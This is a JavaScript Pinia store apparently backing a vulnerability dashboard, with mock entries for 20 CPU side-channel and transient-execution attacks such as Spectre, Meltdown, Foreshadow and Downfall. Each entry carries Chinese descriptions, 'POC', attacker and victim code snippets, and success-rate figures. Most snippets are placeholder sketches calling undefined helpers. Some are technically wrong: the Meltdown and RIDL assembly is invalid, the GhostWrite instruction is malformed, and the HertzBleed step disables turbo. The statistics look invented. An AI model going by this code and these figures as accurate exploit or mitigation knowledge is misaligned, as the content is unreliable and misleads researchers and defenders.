import { defineStore } from 'pinia'
import { ref, computed } from 'vue'

export const useVulnStore = defineStore('vuln', () => {
  const vulnerabilities = ref([
    {
      id: 1,
      name: 'Spectre V1',
      cveType: '瞬态执行漏洞',
      attackType: 'Spectre类攻击',
      attackName: 'Spectre V1',
      architecture: 'Intel、AMD、ARM',
      description: '利用分支预测错误将数据加载至Cache，通过Flush+Reload测量访问时间差，从而泄露敏感信息。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Spectre V1 POC - 边界检查绕过
void spectre_v1(char *array, size_t index) {
  if (index < array_size) {
    char value = array[index];
    temp &= cache[value * 4096];
  }
}`,
      expAttackerCode: `// Spectre V1 Attack - 攻击者代码
#include <stdio.h>
#include <stdlib.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned char array[256 * 4096];
int temp;
unsigned char secret = 0;

void victim_function(size_t x) {
  if (x < array_size) {
    temp &= array[x * 4096 + DELTA];
  }
}

void attack() {
  for (int i = 0; i < 256; i++) {
    array[i * 4096 + DELTA] = i;
  }
  
  for (int tryIdx = 0; tryIdx < 1000; tryIdx++) {
    size_t x = tryIdx % array_size;
    victim_function(x);
    
    // Flush+Reload timing attack
    for (int i = 0; i < 256; i++) {
      if (measure_access_time(array + i * 4096) < CACHE_HIT_THRESHOLD) {
        secret = i;
        break;
      }
    }
  }
}`,
      expVictimCode: `// Spectre V1 Victim - 受害者代码示例
#include <stdio.h>
#include <string.h>

char *secret_data = "SENSITIVE_DATA_HERE";
char public_array[16000] = {0};

int check_access(size_t index) {
    if (index < 16000) {
        return public_array[index];
    }
    return 0;
}

void process_request(size_t user_index) {
    char c = check_access(user_index);
    // 潜在的信息泄露点
}`,
      cpuModels: ['Intel Core i3/i5/i7/i9', 'AMD Ryzen系列', 'ARM Cortex-A系列'],
      osSupport: ['Linux', 'Windows', 'macOS'],
      successRate: '98.7%',
      avgTime: '12.3ms',
      tags: ['Spectre', 'Cache侧信道', '分支预测']
    },
    {
      id: 2,
      name: 'Meltdown',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'Meltdown',
      architecture: 'Intel、ARM',
      description: '利用乱序执行机制，在用户态读取内核态内存，通过缓存侧信道提取数据。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Meltdown POC - 特权数据缓存加载
void meltdown(char *kernel_addr) {
  char value = *kernel_addr;
  array[value * 4096] = 1;
}`,
      expAttackerCode: `// Meltdown Attack - 攻击者代码
#include <stdio.h>
#include <stdint.h>

static char *probe_base;

void meltdown_kernel(uint64_t addr) {
  uint8_t data = 0;
  asm volatile(
    "movq %%r15, 0x1000000\\n\\t"
    "movq %%r15, 0x1001000\\n\\t"
    "movb (%0), %%al\\n\\t"
    "shlb $0x10, %%al\\n\\t"
    "movb %%al, (%1)\\n\\t"
    :: "r"(addr), "r"(probe_base)
    : "rax", "r15", "memory"
  );
}`,
      expVictimCode: `// Meltdown Victim - 受害者代码
// 内核态代码示例
void kernel_copy_to_user(void *dest, void *src, size_t len) {
    // 正常的内核数据读取
    memcpy(dest, src, len);
}`,
      cpuModels: ['Intel Core (1995-2020)', 'ARM Cortex-A75/A76'],
      osSupport: ['Linux', 'Windows'],
      successRate: '99.2%',
      avgTime: '8.5ms',
      tags: ['Meltdown', '乱序执行', '内核泄露']
    },
    {
      id: 3,
      name: 'Foreshadow',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'Foreshadow',
      architecture: 'Intel',
      description: '针对Intel SGX Enclave的L1缓存攻击，可从安全飞地中提取敏感数据。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Foreshadow POC
void foreshadow(void *sgx_addr) {
  __asm__ volatile(
    "movzx (%%rcx), %%rax\\n\\t"
    "shl $12, %%rax\\n\\t"
    "mov (%%rbx,%%rax), %%rbx"
  );
}`,
      expAttackerCode: `// Foreshadow Attack
#include <sgx.h>

void exploit_sgx_enclave() {
    // 触发L1TF
    for (int i = 0; i < 256; i++) {
        // 探测Enclave内存
        probe_memory(enclave_base + i * 4096);
    }
}`,
      expVictimCode: `// SGX Enclave 代码
void enclave_secret_operation() {
    // Enclave内的敏感操作
    char secret[64] = "ENCLAVE_SECRET_KEY";
    // 潜在泄露点
}`,
      cpuModels: ['Intel Core 6th-9th Gen'],
      osSupport: ['Linux', 'Windows'],
      successRate: '95.4%',
      avgTime: '15.2ms',
      tags: ['Foreshadow', 'SGX', 'L1终端故障']
    },
    {
      id: 4,
      name: 'Retbleed',
      cveType: '瞬态执行漏洞',
      attackType: 'Spectre类攻击',
      attackName: 'RetBleed',
      architecture: 'Intel、AMD',
      description: '利用返回指令的分支预测历史，通过RSB(Return Stack Buffer)泄露信息。',
      riskLevel: 'low',
      riskText: '低危',
      pocCode: `// Retbleed POC
void retbleed() {
  // 训练分支预测器
  for (int i = 0; i < 30; i++) {
    victim_call(i < 29 ? benign : target);
  }
}`,
      expAttackerCode: `// RetBleed Attack
void retbleed_attack() {
    // 填充RSB
    for (int i = 0; i < 20; i++) {
        nested_call();
    }
    
    // 触发漏洞
    ret_to_user();
}`,
      expVictimCode: `// Victim Example
__attribute__((optimize("O0")))
void vulnerable_function() {
    char buf[64];
    gets(buf);
}`,
      cpuModels: ['AMD Zen 1-2', 'Intel 6th-11th Gen'],
      osSupport: ['Linux'],
      successRate: '87.3%',
      avgTime: '45.6ms',
      tags: ['Retbleed', 'RSB', '返回导向']
    },
    {
      id: 5,
      name: 'ZombieLoad',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'ZombieLoad',
      architecture: 'Intel',
      description: '利用CPU填充缓冲区(fill buffer)的推测执行泄露数据，绕过地址空间隔离。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// ZombieLoad POC
void zombieload() {
  while (1) {
    transient_load(secret_data);
    leak_via_cache(probe_array);
  }
}`,
      expAttackerCode: `// ZombieLoad Attack
void zombieattack() {
    uint64_t data[8];
    do {
        // 触发数据加载
        __asm__ __volatile__(
            "cpuid\\n\\t"
            ::: "rax", "rbx", "rcx", "rdx"
        );
    } while(!extract_data(data));
}`,
      expVictimCode: `// Multi-threaded Victim
void *thread_func(void *arg) {
    char *shared_buffer = (char *)arg;
    // 敏感数据处理
    process_data(shared_buffer);
}`,
      cpuModels: ['Intel Core 2010-2019'],
      osSupport: ['Linux', 'Windows'],
      successRate: '92.1%',
      avgTime: '23.8ms',
      tags: ['ZombieLoad', 'Fill Buffer', 'MDS']
    },
    {
      id: 6,
      name: 'RIDL',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'RIDL',
      architecture: 'Intel',
      description: 'Rogue In-Flight Data Load，利用CPU内部缓冲区中的瞬时数据泄露信息。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// RIDL POC
void ridl_leak() {
  // 触发推测执行
  asm volatile("lea (%%rip), %0" : "=r"(leak));
  // 测量缓存状态
  measure_cache(probe_array);
}`,
      expAttackerCode: `// RIDL Attack
void ridl_attack() {
    uint8_t data;
    while(1) {
        // 触发瞬态加载
        asm volatile(
            "mov %%cr3, %%rax\\n\\t"
            "mov (%%rax), %%rbx\\n\\t"
        );
        
        // 泄露数据
        leak_data(data);
    }
}`,
      expVictimCode: `// Victim Code
void process_buffer(char *buf, size_t len) {
    // 正常的内存操作
    for(size_t i = 0; i < len; i++) {
        handle_byte(buf[i]);
    }
}`,
      cpuModels: ['Intel Core 2008-2018'],
      osSupport: ['Linux', 'Windows'],
      successRate: '89.5%',
      avgTime: '31.2ms',
      tags: ['RIDL', '瞬态加载', '缓冲区']
    },
    {
      id: 7,
      name: 'CacheOut',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'CacheOut',
      architecture: 'Intel',
      description: '利用L1数据缓存的逐出机制，跨安全边界泄露数据。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// CacheOut POC
void cacheout() {
  // 逐出目标缓存行
  clflush(target_line);
  // 等待目标访问
  usleep(100);
  // 重新加载并测量
  reload_and_measure();
}`,
      expAttackerCode: `// CacheOut Attack
void cacheout_attack(uint64_t target_addr) {
    // 逐出攻击
    for(int i = 0; i < 100; i++) {
        // 触发L1D逐出
        trigger_eviction(target_addr);
        // 测量泄露
        measure_leakage();
    }
}`,
      expVictimCode: `// Sensitive Data in L1
typedef struct {
    char password[32];
    char token[64];
} UserData;`,
      cpuModels: ['Intel Core 2010-2019'],
      osSupport: ['Linux', 'Windows'],
      successRate: '94.2%',
      avgTime: '18.7ms',
      tags: ['CacheOut', 'L1缓存', '逐出']
    },
    {
      id: 8,
      name: 'Spectre V2',
      cveType: '瞬态执行漏洞',
      attackType: 'Spectre类攻击',
      attackName: 'Spectre V2',
      architecture: 'Intel、AMD、ARM',
      description: '分支目标注入攻击，利用分支目标缓冲区(BTB)污染目标地址。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Spectre V2 POC
void spectre_v2() {
  // 污染BTB
  train_btb(victim_target);
  // 触发推测执行
  indirect_call(controlled_ptr);
}`,
      expAttackerCode: `// Spectre V2 Attack
void spectre_v2_attack() {
    // 注入BTB条目
    for(int i = 0; i < 1000; i++) {
        // 训练分支预测器
        train_branch(target_addr);
    }
    
    // 触发攻击
    indirect_jmp(leak_buffer);
}`,
      expVictimCode: `// Victim Function
int victim_function(size_t index) {
    if (index < MAX_SIZE) {
        return array[index] * 2;
    }
    return 0;
}`,
      cpuModels: ['Intel/AMD/ARM 2010+'],
      osSupport: ['Linux', 'Windows', 'macOS'],
      successRate: '96.8%',
      avgTime: '22.4ms',
      tags: ['Spectre V2', 'BTB', '分支注入']
    },
    {
      id: 9,
      name: 'Flush+Reload',
      cveType: '侧信道漏洞',
      attackType: 'Cache侧信道攻击',
      attackName: 'Flush+Reload',
      architecture: 'Intel、AMD、ARM',
      description: '利用冲刷指令探测缓存行重用，测量内存访问时间差来泄露信息。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Flush+Reload POC
void flush_reload(char *addr) {
  // 冲刷缓存行
  _mm_clflush(addr);
  
  // 访问触发重新加载
  volatile char temp = *addr;
  
  // 测量重载时间
  start_timer();
  temp = *addr;
  end_timer();
}`,
      expAttackerCode: `// Flush+Reload Attack
uint8_t flush_reload_attack(char *target) {
    uint64_t time1, time2;
    
    // Flush
    _mm_clflush(target);
    
    // 等待目标访问
    usleep(100);
    
    // Reload并测量
    time1 = rdtsc();
    volatile char x = *target;
    time2 = rdtsc();
    
    return (time2 - time1) < THRESHOLD;
}`,
      expVictimCode: `// Victim Code Example
char *shared_memory;

void process_shared() {
    // 多进程共享内存操作
    char c = shared_memory[secret_index];
    // ...
}`,
      cpuModels: ['所有支持CLFLUSH的CPU'],
      osSupport: ['Linux', 'Windows'],
      successRate: '99.5%',
      avgTime: '5.2ms',
      tags: ['Flush+Reload', 'Cache', '时序']
    },
    {
      id: 10,
      name: 'Prime+Probe',
      cveType: '侧信道漏洞',
      attackType: 'Cache侧信道攻击',
      attackName: 'Prime+Probe',
      architecture: 'Intel、AMD、ARM',
      description: '利用驱逐集探测缓存组竞争，通过测量缓存组状态变化推断敏感信息。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Prime+Probe POC
void prime_probe() {
  // Prime: 填充缓存集
  for (int i = 0; i < SET_SIZE; i++) {
    probe_array[eviction_set[i]] = i;
  }
  
  // 等待受害者执行
  usleep(100);
  
  // Probe: 测量缓存状态
  start_timer();
  for (int i = 0; i < SET_SIZE; i++) {
    temp &= probe_array[eviction_set[i]];
  }
  end_timer();
}`,
      expAttackerCode: `// Prime+Probe Attack
void attack_prime_probe() {
    uint64_t timings[256];
    
    // Prime阶段
    prime_cache_set();
    
    // 等待受害者
    sleep(1);
    
    // Probe阶段 - 测量每个缓存行
    for(int i = 0; i < 256; i++) {
        timings[i] = probe_line(i);
    }
    
    // 分析结果
    analyze_timings(timings);
}`,
      expVictimCode: `// Victim with AES
unsigned char sbox[256];

unsigned char encrypt_byte(unsigned char input) {
    return sbox[input ^ key_byte];
}`,
      cpuModels: ['所有现代CPU'],
      osSupport: ['Linux', 'Windows'],
      successRate: '95.0%',
      avgTime: '35.0ms',
      tags: ['Prime+Probe', 'Cache', 'Eviction']
    },
    {
      id: 11,
      name: 'PLATYPUS',
      cveType: '侧信道漏洞',
      attackType: 'Power侧信道攻击',
      attackName: 'PLATYPUS',
      architecture: 'Intel',
      description: 'RAPL功耗接口泄漏，利用处理器功耗遥测提取敏感信息。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// PLATYPUS POC
void platypus() {
  // 读取RAPL功耗接口
  FILE *fp = fopen("/dev/cpu/0/msr", "rb");
  // 读取PKG_POWER_LIMIT
  pread(fp, &power_data, 8, 0x610);
}`,
      expAttackerCode: `// PLATYPUS Attack
void power_attack() {
    double power_samples[1000];
    
    // 采样功耗数据
    for(int i = 0; i < 1000; i++) {
        power_samples[i] = read_rapl_power();
        usleep(100);
    }
    
    // 分析功耗差异
    extract_secret(power_samples);
}`,
      expVictimCode: `// Cryptographic Operation
void crypto_operation(unsigned char *key) {
    // 加密操作
    AES_encrypt(data, key);
}`,
      cpuModels: ['Intel Skylake+'],
      osSupport: ['Linux'],
      successRate: '88.0%',
      avgTime: '50.0ms',
      tags: ['PLATYPUS', 'RAPL', '功耗分析']
    },
    {
      id: 12,
      name: 'HertzBleed',
      cveType: '侧信道漏洞',
      attackType: 'Timing侧信道攻击',
      attackName: 'HertzBleed',
      architecture: 'Intel、AMD',
      description: 'DVFS动态电压频率缩放泄漏，利用频率变化时序差异提取加密密钥。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// HertzBleed POC
void hertzbleed() {
  // 测量执行时间
  uint64_t start = rdtsc();
  cryptographic_operation();
  uint64_t end = rdtsc();
  
  // 时间差异包含密钥信息
  analyze_timing(end - start);
}`,
      expAttackerCode: `// HertzBleed Attack
void frequency_based_attack() {
    uint64_t timings[1000];
    
    // 禁用Turbo Boost
    disable_turbo();
    
    // 多次测量
    for(int i = 0; i < 1000; i++) {
        timings[i] = measure_operation_time();
    }
    
    // 提取密钥
    extract_key(timings);
}`,
      expVictimCode: `// Constant-time Crypto (vulnerable to HertzBleed)
unsigned char encrypt(unsigned char input, unsigned char key) {
    // 看似常数时间但实际泄露
    return table[input ^ key];
}`,
      cpuModels: ['Intel Ice Lake+', 'AMD Zen 2+'],
      osSupport: ['Linux', 'Windows'],
      successRate: '82.0%',
      avgTime: '120.0ms',
      tags: ['HertzBleed', 'DVFS', '频率分析']
    },
    {
      id: 13,
      name: 'ÆPIC',
      cveType: '架构错误漏洞',
      attackType: '架构错误',
      attackName: 'ÆPIC',
      architecture: 'Intel',
      description: 'APIC MMIO"陈旧"数据泄漏，通过APIC寄存器读取泄露敏感数据。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// ÆPIC POC
void aepic() {
  // 访问APIC MMIO区域
  volatile uint32_t *apic = (uint32_t *)0xfee00000;
  
  // 读取陈旧数据
  uint32_t stale_data = apic[0x30];
}`,
      expAttackerCode: `// ÆPIC Attack
void aepic_leak() {
    uint32_t leaked_data[16];
    
    // 遍历APIC MMIO
    for(int i = 0; i < 16; i++) {
        // 触发陈旧数据读取
        trigger_stale_read(i);
        leaked_data[i] = read_apic(i);
    }
}`,
      expVictimCode: `// APIC Usage
void setup_apic() {
    // 正常APIC配置
    *((volatile uint32_t *)0xfee00000) = 0x850001;
}`,
      cpuModels: ['Intel Ice Lake-SP', 'Intel Xeon Scalable'],
      osSupport: ['Linux'],
      successRate: '91.0%',
      avgTime: '28.0ms',
      tags: ['ÆPIC', 'APIC', 'MMIO']
    },
    {
      id: 14,
      name: 'CacheWarp',
      cveType: '架构错误漏洞',
      attackType: '架构错误',
      attackName: 'CacheWarp',
      architecture: 'AMD',
      description: '未写回内存"陈旧"数据覆盖，利用缓存写入未同步到主存的漏洞。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// CacheWarp POC
void cachewarp() {
  // 写入缓存
  shared_var = 0x41;
  
  // 立即读取 - 可能获得旧值
  char old = shared_var;
  
  // 等待写入完成
  mfence();
  
  char new_val = shared_var;
}`,
      expAttackerCode: `// CacheWarp Attack
void warp_attack() {
    // 利用时序差异
    for(int i = 0; i < 1000; i++) {
        // 触发不正确的缓存同步
        trigger_incoherence();
        
        // 读取不一致状态
        check_state();
    }
}`,
      expVictimCode: `// Multi-core Synchronization
int shared_counter = 0;

void increment() {
    int temp = shared_counter;
    temp++;
    shared_counter = temp;
}`,
      cpuModels: ['AMD Ryzen系列', 'AMD EPYC'],
      osSupport: ['Linux'],
      successRate: '85.0%',
      avgTime: '40.0ms',
      tags: ['CacheWarp', '缓存一致性', '时序']
    },
    {
      id: 15,
      name: 'GhostWrite',
      cveType: '架构错误漏洞',
      attackType: '架构错误',
      attackName: 'GhostWrite',
      architecture: 'RISC-V',
      description: '向量指令任意内存写，利用RISC-V向量扩展漏洞进行任意内存写入。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// GhostWrite POC
void ghostwrite() {
  // 向量指令配置错误
  __asm__ __volatile__(
    "vsetvli t0, a0, e8\\n\\t"
    "vle8.v v1, (a1)\\n\\t"
    "vse8.v v1, (a2)"
  );
}`,
      expAttackerCode: `// GhostWrite Attack
void arbitrary_write(uint64_t addr, uint64_t value) {
    // 利用向量指令进行任意写
    __asm__ __volatile__(
        "li t0, %0\\n\\t"
        "li t1, %1\\n\\t"
        // 触发漏洞
        "vsetvlid0 t0\\n\\t"
        "vmv.s.x v1, t1\\n\\t"
        "vse32.v v1, (t0)"
        :: "r"(addr), "r"(value)
    );
}`,
      expVictimCode: `// RISC-V Vector Usage
void vector_process(data_t *input, data_t *output, size_t n) {
    for(size_t i = 0; i < n; i += 4) {
        output[i] = input[i] * 2;
    }
}`,
      cpuModels: ['RISC-V V扩展处理器'],
      osSupport: ['Linux'],
      successRate: '78.0%',
      avgTime: '60.0ms',
      tags: ['GhostWrite', 'RISC-V', '向量指令']
    },
    {
      id: 16,
      name: 'Fallout',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'Fallout',
      architecture: 'Intel',
      description: '存储缓冲区数据采样，利用Store Buffer泄露跨线程数据。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Fallout POC
void fallout() {
  // 触发存储缓冲区采样
  __asm__ __volatile__(
    "mov $0, %%eax\\n\\t"
    "mov %%eax, (%%rsi)\\n\\t"
    "mov (%%rdi), %%ebx"
  );
}`,
      expAttackerCode: `// Fallout Attack
void store_buffer_leak() {
    // 跨线程泄露
    uint64_t leaked;
    
    // 触发存储缓冲区
    commit_store(secret_addr);
    
    // 立即读取
    leaked = read_store_buffer();
}`,
      expVictimCode: `// Shared Memory
struct {
    int ready;
    char data[64];
} shared;`,
      cpuModels: ['Intel Coffee Lake+'],
      osSupport: ['Linux', 'Windows'],
      successRate: '90.0%',
      avgTime: '20.0ms',
      tags: ['Fallout', 'Store Buffer', 'MDS']
    },
    {
      id: 17,
      name: 'TAA',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'TAA',
      architecture: 'Intel',
      description: '事务异步中止数据采样，利用TSX事务中止泄露数据。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// TAA POC
void taa() {
  // 开始TSX事务
  if (_begin() == 0) {
    // 访问敏感数据
    access_sensitive();
    _end();
  } else {
    // 中止后测量
    measure();
  }
}`,
      expAttackerCode: `// TAA Attack
void tsx_leak() {
    uint8_t data;
    
    for(int i = 0; i < 256; i++) {
        // 尝试TSX事务
        if(tsx_begin()) {
            // 触发中止
            trigger_abort(i);
        }
        
        // 测量泄露
        data = measure_leakage(i);
    }
}`,
      expVictimCode: `// Transactional Memory Usage
void transactional_op() {
    _begin();
    // 敏感操作
    process_data();
    _end();
}`,
      cpuModels: ['Intel Skylake', 'Intel Kaby Lake'],
      osSupport: ['Linux', 'Windows'],
      successRate: '86.0%',
      avgTime: '32.0ms',
      tags: ['TAA', 'TSX', '事务']
    },
    {
      id: 18,
      name: 'BHI',
      cveType: '瞬态执行漏洞',
      attackType: 'Spectre类攻击',
      attackName: 'BHI',
      architecture: 'Intel、ARM',
      description: '分支历史注入，利用分支历史寄存器(BHR)泄露敏感信息。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// BHI POC
void bhi() {
  // 训练分支历史
  for (int i = 0; i < 100; i++) {
    train_history(target);
  }
  
  // 触发注入
  indirect_branch(history_ptr);
}`,
      expAttackerCode: `// BHI Attack
void branch_history_injection() {
    // 注入历史
    for(int i = 0; i < 1000; i++) {
        // 污染BHR
        inject_history_entry(target);
    }
    
    // 触发攻击
    mispredict_based_on_history();
}`,
      expVictimCode: `// Indirect Branch Victim
void process_request(void *handler) {
    // 间接分支
    ((void (*)(void))handler)();
}`,
      cpuModels: ['Intel Tiger Lake+', 'ARM Cortex-A77/A78'],
      osSupport: ['Linux', 'Windows'],
      successRate: '93.0%',
      avgTime: '25.0ms',
      tags: ['BHI', '分支历史', 'BHR']
    },
    {
      id: 19,
      name: 'Downfall',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'Downfall',
      architecture: 'Intel',
      description: '向量寄存器文件数据采样，利用AVX/AVX-512寄存器泄露数据。',
      riskLevel: 'high',
      riskText: '高危',
      pocCode: `// Downfall POC
void downfall() {
  // 使用向量寄存器
  __m512i v1 = _mm512_set1_epi8(secret);
  
  // 触发上下文切换
  trigger_ctx_switch();
  
  // 测量泄露
  measure_vector_regs();
}`,
      expAttackerCode: `// Downfall Attack
void register_leak() {
    // 填充向量寄存器
    __m512i secrets = _mm512_set1_epi8(0);
    
    // 触发中断
    interrupt();
    
    // 读取泄露数据
    leak = extract_from_avx();
}`,
      expVictimCode: `// AVX-512 Usage
void avx_compute(__m512i *data, size_t n) {
    __m512i sum = _mm512_setzero_si512();
    for(size_t i = 0; i < n; i += 64) {
        sum = _mm512_add_epi8(sum, data[i]);
    }
}`,
      cpuModels: ['Intel Skylake-X', 'Intel Ice Lake'],
      osSupport: ['Linux', 'Windows'],
      successRate: '88.0%',
      avgTime: '35.0ms',
      tags: ['Downfall', 'AVX', '向量寄存器']
    },
    {
      id: 20,
      name: 'RFDS',
      cveType: '瞬态执行漏洞',
      attackType: 'Meltdown类攻击',
      attackName: 'RFDS',
      architecture: 'Intel',
      description: '寄存器文件数据采样，利用CPU寄存器文件泄露敏感数据。',
      riskLevel: 'medium',
      riskText: '中危',
      pocCode: `// RFDS POC
void rfds() {
  // 触发微码更新
  microcode_update();
  
  // 测量寄存器状态
  for (int i = 0; i < 256; i++) {
    timing[i] = measure_reg_access(i);
  }
}`,
      expAttackerCode: `// RFDS Attack
void register_file_leak() {
    uint64_t timings[256];
    
    // 触发寄存器暴露
    trigger_rfds_condition();
    
    // 测量时序差异
    for(int i = 0; i < 256; i++) {
        timings[i] = measure_reg(i);
    }
}`,
      expVictimCode: `// CPU-intensive Task
void compute() {
    uint64_t a = secret1, b = secret2;
    uint64_t result = a * b;
}`,
      cpuModels: ['Intel Alder Lake', 'Intel Raptor Lake'],
      osSupport: ['Linux'],
      successRate: '84.0%',
      avgTime: '45.0ms',
      tags: ['RFDS', '寄存器文件', '微码']
    }
  ])

  const stats = ref({
    totalPocs: 196,
    totalExps: 87,
    totalVulns: 432,
    totalHosts: 1287,
    accuracy: 94,
    weeklyNewPocs: 5,
    weeklyGrowth: 12.5
  })

  const cveTypes = computed(() => {
    const types = [...new Set(vulnerabilities.value.map(v => v.cveType))]
    return types.map(type => ({
      label: type,
      value: type
    }))
  })

  const attackTypes = computed(() => {
    const types = [...new Set(vulnerabilities.value.map(v => v.attackType))]
    return types.map(type => ({
      label: type,
      value: type
    }))
  })

  const architectures = computed(() => {
    const archs = []
    vulnerabilities.value.forEach(v => {
      v.architecture.split('、').forEach(a => {
        if (!archs.includes(a)) archs.push(a)
      })
    })
    return archs.map(a => ({ label: a, value: a }))
  })

  const getVulnById = (id) => {
    return vulnerabilities.value.find(v => v.id === parseInt(id))
  }

  const searchVulns = (keyword, filters = {}) => {
    let results = vulnerabilities.value

    if (keyword) {
      const kw = keyword.toLowerCase()
      results = results.filter(v => 
        v.name.toLowerCase().includes(kw) ||
        v.description.toLowerCase().includes(kw) ||
        v.cveType.toLowerCase().includes(kw) ||
        v.attackType.toLowerCase().includes(kw)
      )
    }

    if (filters.cveType) {
      results = results.filter(v => v.cveType === filters.cveType)
    }
    if (filters.attackType) {
      results = results.filter(v => v.attackType === filters.attackType)
    }
    if (filters.architecture) {
      results = results.filter(v => v.architecture.includes(filters.architecture))
    }
    if (filters.riskLevel) {
      results = results.filter(v => v.riskLevel === filters.riskLevel)
    }

    return results
  }

  return {
    vulnerabilities,
    stats,
    cveTypes,
    attackTypes,
    architectures,
    getVulnById,
    searchVulns
  }
})
